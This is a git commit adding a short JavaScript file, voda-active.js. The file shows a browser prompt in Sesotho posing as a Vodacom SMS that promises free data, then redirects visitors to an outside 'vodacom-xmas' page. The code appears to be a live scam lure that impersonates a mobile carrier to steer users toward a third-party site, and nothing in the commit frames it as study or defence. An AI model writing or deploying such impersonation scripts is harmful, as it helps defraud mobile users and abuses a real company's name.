3edd2b5adff0180b4eb3735c160ab7450a3846ec
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-12 20:52:19 +0100

    Create voda-active.js

---
+++ voda-active.js
@@ -0,0 +1,5 @@
+var password = 'Kenya tshebetsong'
+password=prompt('SMS: Kea u lebohela, nomoro ea hau e loketse ho fumana data mahala ho tsoa ho Vodacom, tobetsa OK ho kenya tšebetsong hona joale','Kenya tshebetsong');
+if (password != 'Kenya tshebetsong') {
+location.href='https://lhegit.org/vodacom-xmas.html';
+}
